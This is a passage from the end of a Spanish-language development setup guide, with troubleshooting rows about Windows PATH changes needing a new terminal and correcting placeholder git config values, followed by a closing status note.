| Cambios de PATH no se reflejan en la terminal actual | Windows solo actualiza el PATH en terminales nuevas | Cerrar y reabrir la terminal (o VS Code completo) después de instalar Python, Git, o cambiar el PATH |
| `git config` quedó con valores de ejemplo ("Tu Nombre", "tu-email@ejemplo.com") | Se copiaron los comandos sin reemplazar los placeholders | Volver a correr `git config --global user.name`/`user.email` con los datos reales; sobrescribe el valor anterior sin necesidad de deshacer nada |

---

*Documento de desarrollo — Pasos 1 a 9 completados y verificados. Las mejoras acordadas para la entrega final se documentan en un archivo aparte.*
